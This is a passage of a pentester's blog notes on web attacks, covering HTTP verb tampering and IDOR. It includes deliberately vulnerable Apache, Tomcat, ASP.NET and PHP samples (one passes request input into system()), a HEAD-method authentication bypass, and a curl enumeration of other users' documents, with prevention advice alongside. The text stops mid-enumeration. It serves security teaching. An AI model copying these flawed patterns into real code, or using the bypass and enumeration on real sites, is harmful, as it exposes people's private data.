@@ -1,0 +1,543 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Notes Web Attacks" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="As modern web applications become more complex and advanced, so do the types of attacks utilized against them. Attacking external-facing web applications may result in compromise of the businesses’ internal network, which may eventually lead to stolen assets or disrupted services." /><meta property="og:description" content="As modern web applications become more complex and advanced, so do the types of attacks utilized against them. Attacking external-facing web applications may result in compromise of the businesses’ internal network, which may eventually lead to stolen assets or disrupted services." /><link rel="canonical" href="zeropio.github.io/notes/vulnerabilities/web-attacks" /><meta property="og:url" content="zeropio.github.io/notes/vulnerabilities/web-attacks" /><meta property="og:site_name" content="Zeropio’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-02T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes Web Attacks" /><meta name="twitter:site" content="@ZeropioWasTaken" /><meta name="twitter:creator" content="@Zeropio" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio"},"dateModified":"2022-08-02T00:00:00+02:00","datePublished":"2022-08-02T00:00:00+02:00","description":"As modern web applications become more complex and advanced, so do the types of attacks utilized against them. Attacking external-facing web applications may result in compromise of the businesses’ internal network, which may eventually lead to stolen assets or disrupted services.","headline":"Notes Web Attacks","mainEntityOfPage":{"@type":"WebPage","@id":"zeropio.github.io/notes/vulnerabilities/web-attacks"},"url":"zeropio.github.io/notes/vulnerabilities/web-attacks"}</script><title>Notes | Web Attacks | Zeropio's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Zeropio's Blog"><meta name="application-name" content="Zeropio's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Zeropio's Blog</a></div><div class="site-subtitle font-italic">CTF enjoyer and pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-lightbulb-o ml-xl-3 mr-xl-3 unloaded"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/zeropio" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/ZeropioWasTaken" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | Web Attacks</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | Web Attacks</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1659391200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 2, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> zeropio </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6004 words"> <em>33 min</em> read</span></div></div></div><div class="post-content"><p>As modern web applications become more complex and advanced, so do the types of attacks utilized against them. Attacking external-facing web applications may result in compromise of the businesses’ internal network, which may eventually lead to stolen assets or disrupted services.</p><hr /><h1 id="http-verb-tampering">HTTP Verb Tampering</h1><p>The HTTP protocol works by accepting various HTTP methods as verbs at the beginning of an HTTP request. While programmers mainly consider the two most commonly used HTTP methods, <strong>GET</strong> and <strong>POST</strong>, any client can send any other methods in their HTTP requests and then see how the web server handles these methods. If the web server configurations are not restricted to only accept the HTTP methods required by the web server, and the web application is not developed to handle other types of HTTP requests, then we may be able to exploit this insecure configuration to gain access to functionalities we do not have access to, or even bypass certain security controls.</p><p>HTTP has <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">nine different verbs</a>. Apart from <strong>GET</strong> and <strong>POST</strong> these are some of the most common:</p><div class="table-wrapper"><table><thead><tr><th><strong>Verb</strong><th><strong>Description</strong><tbody><tr><td><code class="language-plaintext highlighter-rouge">HEAD</code><td>Identical to a GET request, but its response only contains the headers, without the response body<tr><td><code class="language-plaintext highlighter-rouge">PUT</code><td>Writes the request payload to the specified location<tr><td><code class="language-plaintext highlighter-rouge">DELETE</code><td>Deletes the resource at the specified location<tr><td><code class="language-plaintext highlighter-rouge">OPTIONS</code><td>Shows different options accepted by a web server, like accepted HTTP verbs<tr><td><code class="language-plaintext highlighter-rouge">PATCH</code><td>Apply partial modifications to the resource at the specified location</table></div><p>Insecure web server configurations cause the first type of <strong>HTTP Verb Tampering</strong> vulnerabilities. For example, a system admin may use the following configuration to require authentication on a particular web page:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nt">&lt;Limit</span> <span class="err">GET</span> <span class="err">POST</span><span class="nt">&gt;</span>
+    Require valid-user
+<span class="nt">&lt;/Limit&gt;</span>
+</pre></table></code></div></div><p>Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"/^[A-Za-z\s]+$/"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"code"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"Select * from ports where port_code like '%"</span> <span class="mf">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"code"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"%'"</span><span class="p">;</span>
+    <span class="mf">...</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>As we can see, only the <strong>GET</strong> is protected.</p><h2 id="bypassing-basic-authentication"><span class="mr-2">Bypassing Basic Authentication</span><a href="#bypassing-basic-authentication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. The first type of HTTP Verb Tampering vulnerability is mainly caused by <strong>Insecure Web Server Configurations</strong>. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. To try and exploit the page, we need to identify the HTTP request method used by the web application. We can intercept the request in <strong>Burp Suite</strong> and examine it.</p><p>If the page uses a <strong>GET</strong> request, change it to a <strong>POST</strong>. (Right click in the Burp Repeater to change the method). If none of these work, try with the <strong>HEAD</strong> method. If we see something as:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>curl <span class="nt">-I</span> http://&lt;TARGET&gt;/forbidden-page.php
+<span class="go">
+HTTP/1.1 200 OK
+Date: 
+Server: Apache/2.4.41 (Ubuntu)
+Allow: POST,OPTIONS,HEAD,GET
+Content-Length: 0
+Content-Type: httpd/unix-directory
+</span></pre></table></code></div></div><p>We can see the <strong>Allow</strong> header, which specify which one we can use. Once we use the <strong>HEAD</strong> we bypass the securization.</p><blockquote class="prompt-info"><div><p>Bypass is not limited to the <strong>HEAD</strong> method, try all of them.</p></div></blockquote><h2 id="bypassing-security-filters"><span class="mr-2">Bypassing Security Filters</span><a href="#bypassing-security-filters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The other and more common type of HTTP Verb Tampering vulnerability is caused by <strong>Insecure Coding</strong> errors made during the development of the web application. This explotation is similar to the previous one. With trial and error until we get the correct one.</p><h2 id="verb-tampering-prevention"><span class="mr-2">Verb Tampering Prevention</span><a href="#verb-tampering-prevention" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="insecure-configuration"><span class="mr-2">Insecure Configuration</span><a href="#insecure-configuration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including <strong>Apache</strong>, <strong>Tomcat</strong>, and <strong>ASP.NET</strong>. The vulnerability usually happens when we limit a page’s authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected.</p><p>The following is an example of a vulnerable configuration for an <strong>Apache</strong> web server, which is located in the site configuration file (<code class="language-plaintext filepath highlighter-rouge">000-default.conf</code>), or in a <code class="language-plaintext filepath highlighter-rouge">.htaccess</code> web page configuration file:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nt">&lt;Directory</span> <span class="err">"/var/www/html/admin"</span><span class="nt">&gt;</span>
+    AuthType Basic
+    AuthName "Admin Panel"
+    AuthUserFile /etc/apache2/.htpasswd
+    <span class="nt">&lt;Limit</span> <span class="err">GET</span><span class="nt">&gt;</span>
+        Require valid-user
+    <span class="nt">&lt;/Limit&gt;</span>
+<span class="nt">&lt;/Directory&gt;</span>
+</pre></table></code></div></div><p>As the <code class="language-plaintext highlighter-rouge">&lt;Limit GET&gt;</code> keyword is being used, the <code class="language-plaintext highlighter-rouge">Require valid-user</code> setting will only apply to <strong>GET</strong> requests, leaving the page accessible through <strong>POST</strong> requests. Even if both <strong>GET</strong> and <strong>POST</strong> were specified, this would leave the page accessible through other methods, like <strong>HEAD</strong> or <strong>OPTIONS</strong>. The following example shows the same vulnerability for a <strong>Tomcat</strong> web server configuration, which can be found in the <code class="language-plaintext filepath highlighter-rouge">web.xml</code> file for a certain Java web application:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nt">&lt;security-constraint&gt;</span>
+    <span class="nt">&lt;web-resource-collection&gt;</span>
+        <span class="nt">&lt;url-pattern&gt;</span>/admin/*<span class="nt">&lt;/url-pattern&gt;</span>
+        <span class="nt">&lt;http-method&gt;</span>GET<span class="nt">&lt;/http-method&gt;</span>
+    <span class="nt">&lt;/web-resource-collection&gt;</span>
+    <span class="nt">&lt;auth-constraint&gt;</span>
+        <span class="nt">&lt;role-name&gt;</span>admin<span class="nt">&lt;/role-name&gt;</span>
+    <span class="nt">&lt;/auth-constraint&gt;</span>
+<span class="nt">&lt;/security-constraint&gt;</span>
+</pre></table></code></div></div><p>We can see that the authorization is being limited only to the <strong>GET</strong> method with http-method, which leaves the page accessible through other HTTP methods. And this is an example for <strong>ASP .NET</strong> in the <code class="language-plaintext filepath highlighter-rouge">web.config</code>:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nt">&lt;system.web&gt;</span>
+    <span class="nt">&lt;authorization&gt;</span>
+        <span class="nt">&lt;allow</span> <span class="na">verbs=</span><span class="s">"GET"</span> <span class="na">roles=</span><span class="s">"admin"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;deny</span> <span class="na">verbs=</span><span class="s">"GET"</span> <span class="na">users=</span><span class="s">"*"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;/deny&gt;</span>
+        <span class="nt">&lt;/allow&gt;</span>
+    <span class="nt">&lt;/authorization&gt;</span>
+<span class="nt">&lt;/system.web&gt;</span>
+</pre></table></code></div></div><p>If we want to specify a single method, we can use safe keywords, like <code class="language-plaintext highlighter-rouge">LimitExcept</code> in Apache, <code class="language-plaintext highlighter-rouge">http-method-omission</code> in Tomcat, and <code class="language-plaintext highlighter-rouge">add</code>/<code class="language-plaintext highlighter-rouge">remove</code> in ASP.NET, which cover all verbs except the specified ones. Finally, to avoid similar attacks, we should generally consider disabling/denying all <strong>HEAD</strong> requests unless specifically required by the web application.</p><h3 id="insecure-coding"><span class="mr-2">Insecure Coding</span><a href="#insecure-coding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Let’s consider the following PHP code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[^A-Za-z0-9. _-]/'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">system</span><span class="p">(</span><span class="s2">"touch "</span> <span class="mf">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"Malicious Request Denied!"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">preg_match</code> function properly looks for unwanted special characters and does not allow the input to go into the command if any special characters are found. However, the fatal error made in this case is not due to <strong>Command Injections</strong> but due to the inconsistent use of HTTP methods. We see that the <code class="language-plaintext highlighter-rouge">preg_match</code> filter only checks for special characters in <strong>POST</strong> parameters with <code class="language-plaintext highlighter-rouge">$_POST['filename']</code>. However, the final system command uses the <code class="language-plaintext highlighter-rouge">$_REQUEST['filename']</code> variable, which covers both <strong>GET</strong> and <strong>POST</strong> parameters.</p><p>To avoid HTTP Verb Tampering vulnerabilities in our code, <strong>we must be consistent with our use of HTTP methods</strong> and ensure that the same method is always used for any specific functionality across the web application. It is always advised to <strong>expand the scope of testing in security filters</strong> by testing all request parameters. This can be done with the following functions and variables:</p><div class="table-wrapper"><table><thead><tr><th><strong>Language</strong><th><strong>Function</strong><tbody><tr><td>PHP<td><code class="language-plaintext highlighter-rouge">$_REQUEST['param']</code><tr><td>Java<td><code class="language-plaintext highlighter-rouge">request.getParameter('param')</code><tr><td>C#<td><code class="language-plaintext highlighter-rouge">Request['param']</code></table></div><hr /><h1 id="insecure-direct-object-references-idor">Insecure Direct Object References (IDOR)</h1><p>IDOR vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. Building a solid access control system is very challenging, which is why IDOR vulnerabilities are pervasive. For example, if users request access to a file they recently uploaded, they may get a link to it such as <code class="language-plaintext highlighter-rouge">download.php?file_id=123</code>. So, as the link directly references the file with <code class="language-plaintext highlighter-rouge">file_id=123</code>, what would happen if we tried to access another file with <code class="language-plaintext highlighter-rouge">download.php?file_id=124</code>?</p><p>Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. However, this may make it possible to exploit another vulnerability: a <strong>weak access control system</strong>. There are many ways of implementing a solid access control system for web applications, like having a <strong>Role-Based Access Control</strong> (<strong>RBAC</strong>) system. The main takeaway is that <strong>an IDOR vulnerability mainly exists due to the lack of an access control on the back-end</strong>. If a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users’ data.</p><p>he most basic example of an IDOR vulnerability is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data, which is known as <strong>IDOR Information Disclosure Vulnerabilities</strong>. IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with <strong>IDOR Insecure Function Calls</strong>.</p><h2 id="identifying-idors"><span class="mr-2">Identifying IDORs</span><a href="#identifying-idors" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="url-parameters--apis"><span class="mr-2">URL Parameters &amp; APIs</span><a href="#url-parameters--apis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The very first step of exploiting IDOR vulnerabilities is identifying <strong>Direct Object References</strong>. These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies. In the most basic cases, we can try incrementing the values of the object references to retrieve other data. We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.</p><p>For example <code class="language-plaintext highlighter-rouge">?id=1</code>.</p><h3 id="ajax-calls"><span class="mr-2">AJAX Calls</span><a href="#ajax-calls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.</p><p>The following example shows a basic example of an AJAX call:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">changeUserPassword</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+        <span class="na">url</span><span class="p">:</span><span class="dl">"</span><span class="s2">change_password.php</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">dataType</span><span class="p">:</span> <span class="dl">"</span><span class="s2">json</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">data</span><span class="p">:</span> <span class="p">{</span><span class="na">uid</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">uid</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="p">,</span> <span class="na">is_admin</span><span class="p">:</span> <span class="nx">is_admin</span><span class="p">},</span>
+        <span class="na">success</span><span class="p">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
+            <span class="c1">//</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (open-source web applications).</p><h3 id="understand-hashingencoding"><span class="mr-2">Understand Hashing/Encoding</span><a href="#understand-hashingencoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.</p><p>For example <code class="language-plaintext highlighter-rouge">?id=MQ==</code></p><h3 id="compare-user-roles"><span class="mr-2">Compare User Roles</span><a href="#compare-user-roles" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.</p><p>For example, if we had access to two different users, one of which can view their salary after making the following API call:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+  </span><span class="nl">"attributes"</span><span class="w"> </span><span class="p">:</span><span class="w"> 
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"salary"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"/services/data/salaries/users/1"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"Id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"1"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"User1"</span><span class="w">
+
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>The second user may not have all of these API parameters to replicate the call. However, we can try repeating the same API call while logged in as User2 to see if the web application returns anything.</p><h2 id="mass-idor-enumeration"><span class="mr-2">Mass IDOR Enumeration</span><a href="#mass-idor-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.</p><h3 id="insecure-parameters"><span class="mr-2">Insecure Parameters</span><a href="#insecure-parameters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Take for example a employee web. We access with our account, identify by <code class="language-plaintext highlighter-rouge">?userid=1</code>. Navigatint through the files we see some files like <code class="language-plaintext filepath highlighter-rouge">/documents/Invoice_1_09_2021.pdf</code> and <code class="language-plaintext filepath highlighter-rouge">/documents/Report_1_10_2021.pdf</code>. Files with a simply pattern, the name, the userid and a date. This is called <strong>Static File IDOR</strong>. However, we only can guess files that start by <strong>Invoice</strong> and <strong>Report</strong>.</p><p>Now it’s time to change the id: <code class="language-plaintext highlighter-rouge">?userid=2</code>. If the back-end end of the web application does have a proper access control system, we will get some form of <strong>Access Denied</strong>. Now we can see similar files to our own, but changing the <code class="language-plaintext highlighter-rouge">1</code> by <code class="language-plaintext highlighter-rouge">2</code>.</p><h3 id="mass-enumeration"><span class="mr-2">Mass Enumeration</span><a href="#mass-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can try manually accessing other employee documents with <code class="language-plaintext highlighter-rouge">uid=3</code>, <code class="language-plaintext highlighter-rouge">uid=4</code>, and so on. Manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files or write a small bash script to download all files, which is what we will do.</p><p>Checking the source code we can see something like:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">'pure-tree_link'</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">'/documents/Invoice_3_06_2020.pdf'</span> <span class="na">target=</span><span class="s">'_blank'</span><span class="nt">&gt;</span>Invoice<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+<span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">'pure-tree_link'</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">'/documents/Report_3_01_2020.pdf'</span> <span class="na">target=</span><span class="s">'_blank'</span><span class="nt">&gt;</span>Report<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+</pre></table></code></div></div><p>With cURL and grep we can start the enumeration:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s2">"http://&lt;TARGET&gt;/documents.php?uid=1"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\/</span><span class="s2">documents.*?.pdf"</span>
+<span class="go">
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
